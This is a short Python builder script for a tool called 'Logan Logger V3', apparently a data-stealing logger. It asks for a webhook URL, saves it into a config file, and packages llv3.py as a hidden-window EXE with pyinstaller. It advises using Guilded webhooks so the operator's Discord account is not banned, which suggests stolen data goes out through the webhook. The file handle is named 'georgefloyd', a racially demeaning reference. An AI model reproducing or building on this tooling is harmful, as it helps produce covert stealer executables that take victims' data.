import os
import ctypes 

ctypes.windll.kernel32.SetConsoleTitleW("Logan Logger V3 | Setup")

os.system('cls')

print('TIP: Use Guilded webhooks instead of Discord webhooks to prevent getting your account banned.')
whurl = input('Enter webhook URL: ')

with open("wh.py", "w") as georgefloyd:
    georgefloyd.write(f"url = '{whurl}'\n")
    
print("(+) Sent webhook to wh.py. Building EXE.")
os.system("pyinstaller --onefile --windowed llv3.py")
os.startfile('dist')